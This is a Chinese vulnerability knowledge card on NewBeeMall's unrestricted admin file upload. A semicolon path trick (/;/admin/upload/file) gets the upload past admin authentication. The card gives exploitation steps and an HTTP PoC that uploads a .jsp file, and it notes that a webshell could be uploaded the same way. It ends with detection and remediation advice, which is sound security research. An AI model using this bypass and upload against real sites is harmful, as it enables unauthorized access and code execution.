---
id: web-generic-file-upload-newbeemall-admin-upload-jsp
title: NewBeeMall /;/admin/upload/file 未校验后缀上传 JSP：分号绕过后台鉴权后任意文件落 Web 根
type: scenario
domain: web
path: web/generic/file-upload
technique: spring-admin-upload-original-extension-semicolon-bypass
aliases:
- NewBeeMall 任意文件上传
- /admin/upload/file
- 时间戳+随机数+后缀
- 后台上传 JSP
- 分号绕过上传鉴权
- FILE_UPLOAD_DIC
tags:
- file-upload
- java
- spring
- unrestricted-upload
- webshell
- path-confusion
- newbee-mall
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:08:33+08:00'
  notes: 已对照原文与图09/10核对：UploadController 类级 @RequestMapping(/admin) + @PostMapping(/upload/file)，原始文件名取最后后缀、时间戳+随机数+后缀、transferTo(FILE_UPLOAD_DIC)，无类型校验；POST /;/admin/upload/file 上传 1.jsp 返回 /upload/20251128_17213145.jsp。未验证点：文章未访问 JSP 验证执行，卡已标 confidence medium；未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

NewBeeMall 后台 `UploadController` 的 `POST /admin/upload/file` 取原始文件名最后一个后缀，用 `yyyyMMdd_HHmmss + 随机数 + 后缀` 命名后保存到 `Constants.FILE_UPLOAD_DIC`，没有任何扩展名/Content-Type/内容校验；配合 `/;/admin/upload/file` 的分号鉴权绕过，未登录即可上传 `1.jsp` 并拿到 `/upload/20251128_17213145.jsp` 的公开 URL（文章未验证 JSP 是否被容器解析执行）。

## 原理

- 路由：`@Controller @RequestMapping("/admin") class UploadController`，方法 `@PostMapping({"/upload/file"})`。
- 命名：`String fileName = file.getOriginalFilename(); String suffixName = fileName.substring(fileName.lastIndexOf("."));`，`SimpleDateFormat("yyyyMMdd_HHmmss")` + `Random.nextInt(100)` + `suffixName` 组成新文件名。
- 写入：`File destFile = new File(Constants.FILE_UPLOAD_DIC + newFileName); file.transferTo(destFile);`，成功后返回 `ResultGenerator.genSuccessResult(NewBeeMallUtils.getHost(new URI(request.getRequestURL() + "")) + "/upload/" + newFileName)`。
- 缺陷：后缀完全来自客户端原始文件名，没有白名单；没有 MIME/魔数/图片二次渲染；文件名虽含时间戳+随机数，但只影响不可预测性，不限制类型。返回的 URL 直接把上传文件暴露在 `/upload/` 下。
- 鉴权：该路由属于 `/admin` 前缀，正常应被 `AdminLoginInterceptor` 拦截；但拦截器用 `getRequestURI().startsWith("/admin")`，请求 `/;/admin/upload/file` 的原始 URI 不以 `/admin` 开头而放行，容器归一化后仍路由到上传接口，因此未登录即可上传。
- 危害：任意文件写入 Web 根目录。若目标容器/部署会解析 JSP，可直接 getshell；Spring Boot 默认静态资源不编译 JSP 时，仍可上传 HTML/SVG 做同源存储型 XSS、钓鱼页或恶意文件托管。文章只证明上传成功与 URL 返回，未访问该 JSP 验证执行。

## 触发条件

- 目标为 NewBeeMall（或同款 Spring MVC 代码），`UploadController` 的 `/admin/upload/file` 可达。
- `AdminLoginInterceptor` 存在 `getRequestURI().startsWith("/admin")` 分号绕过（见关联卡）。
- `Constants.FILE_UPLOAD_DIC` 位于 Web 可访问目录，且 `/upload/**` 可公开访问。
- 若要求 RCE，目标容器需解析上传的脚本后缀（如传统 Tomcat + JSP）。

## 利用步骤

1. 用 `/;/admin/index` 确认分号绕过可进入后台。
2. 构造 multipart POST 到 `/;/admin/upload/file`，`file` 字段文件名 `1.jsp`，Content-Type 设为 `image/jpeg`，内容为测试字符串或 webshell。
3. 响应 200 并返回 `data` 中的 `/upload/<时间戳>_<随机数>.jsp` URL。
4. 访问该 URL 验证文件可下载/打开；若容器解析 JSP，则执行 webshell；否则评估 HTML/SVG 存储型 XSS。
5. 结合其他后台接口继续利用。

## PoC

```http
POST /;/admin/upload/file HTTP/1.1
Host: target.example:28089
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLisYqu7bjr3KeGEi
Content-Length: 214

------WebKitFormBoundaryLisYqu7bjr3KeGEi
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

test
------WebKitFormBoundaryLisYqu7bjr3KeGEi--
```

```text
# 预期：HTTP/1.1 200
# {"resultCode":200,"message":"SUCCESS","data":"http://127.0.0.1:28089/upload/20251128_17213145.jsp"}
# 访问 data 中的 URL 可获取上传文件；文章未验证 JSP 被执行。
```

## 变体与关联

- 变体：上传 `.html`/`.svg` 做同源存储型 XSS；`.jsp`/`.jspx` 在支持 JSP 的容器尝试 getshell；`Content-Type` 不影响落盘类型。
- 变体：`Constants.FILE_UPLOAD_DIC` 若可通过配置/环境变量改变，落点可能不同。
- 关联：[[web-generic-auth-newbeemall-semicolon-admin-bypass]]（绕过 `/admin` 鉴权的入口）；[[web-generic-file-upload-spring-uuid-preserve-original-extension]]（UUID/随机名保留原后缀的同类上传）；[[web-generic-file-upload-xiaozhi-upload-any-extension-webroot]]（Spring 上传任意后缀落 Web 根）；[[web-generic-file-upload-html-static-stored-xss]]（HTML 上传存储型 XSS）。
- 边界：文章只展示上传成功与返回 URL，未访问 JSP 验证解析；NewBeeMall 默认 Spring Boot 静态资源通常不执行 JSP，RCE 需目标部署支持。confidence 定为 medium。

## 检测与防御

- 检测：审计上传接口的后缀/内容校验与落盘目录；监控 `/admin/upload/file`（含 `/;/admin/upload/file` 变体）上传 `.jsp`、`.html`、`.svg` 等非预期类型；监控 `/upload/` 下新增脚本文件与被访问情况。
- 修复：扩展名白名单 + 内容/魔数校验 + 强制安全后缀/重命名；上传目录移出 Web 根并禁止脚本执行；修复 `getRequestURI` 分号绕过。
- 加固：后台接口统一鉴权（规范化路径）；上传接口要求管理员角色；`/upload/**` 响应加 `Content-Disposition: attachment` 与 `X-Content-Type-Options: nosniff`。
